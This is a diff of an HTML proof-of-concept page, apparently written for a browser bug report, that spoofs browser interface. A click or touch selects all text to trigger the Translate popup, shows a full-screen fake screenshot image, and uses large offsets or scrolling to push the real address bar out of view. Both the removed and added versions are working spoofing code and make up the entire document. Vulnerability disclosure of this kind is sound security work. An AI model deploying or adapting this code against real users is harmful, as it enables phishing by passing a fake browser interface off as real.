@@ -1,57 +1,29 @@
-<!DOCTYPE html>
-<html lang="en" onmousedown="trigger()" ontouchstart="trigger()" onclick="trigger()">
-<head>
-  <meta charset="UTF-8">
-  <title>Phantom</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: #000;
-      overflow: hidden;
-    }
+<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
 
-    #spoofImage {
-      display: none;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 9999;
-    }
-
-    #hiddenText {
-      margin-top: 99999px;
-      user-select: text;
-      font-size: 16px;
-      color: transparent;
-    }
-  </style>
-</head>
-<body>
-  <!-- Spoofed Screenshot -->
-  <img id="spoofImage" src="spoof.jpeg" alt="spoof page" />
-
-  <!-- This text triggers the Translate popup -->
-  <p id="hiddenText">
-    مرحبا بكم في موقع فانتوم. Привет мир. これはスプーフです。
-    هذا مجرد اختبار للاستخدام في تقرير البق.
-  </p>
-
-  <script>
-    function trigger() {
-      try {
-        // Select all content to invoke Translate
+<script>
+    function rfsSelectAll() {
         document.execCommand("selectAll");
-        // Show the fake UI
-        document.getElementById("spoofImage").style.display = "block";
-        // Try to scroll so that address bar gets hidden
-        window.scrollTo(0, 100000);
-      } catch (e) {}
+      document.getElementById("spoof").style   = "display: block;";
+
     }
-  </script>
+
+    function selectAllChildren() {
+        document.getSelection().selectAllChildren(paragraph1);
+    }
+</script>
+
+<body>
+            <img id="spoof" style="display: none;" src="spoof.png"></img>
+
+    <img style="margin-top: 9999px;"></img>
+
+    <p id="paragraph1">
+        <!-- Trigger Translate Menu -->
+        A[=
+        ?:TLv
+        S9y
+        <!-- Trigger Translate Menu -->
+    </p>
 </body>
+
 </html>
